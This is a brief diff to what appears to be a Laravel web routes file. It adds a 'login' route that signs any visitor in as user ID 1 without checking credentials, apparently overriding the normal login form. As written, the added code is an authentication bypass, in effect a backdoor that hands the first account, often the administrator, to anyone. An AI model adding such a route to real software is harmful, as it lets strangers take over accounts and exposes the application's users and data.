@@ -18,3 +18,8 @@ Route::get('/', function () {
 Auth::routes();
 
 Route::get('/home', 'HomeController@index');
+
+Route::get('login', function () {
+    auth()->loginUsingId(1);
+    return redirect()->intended();
+});
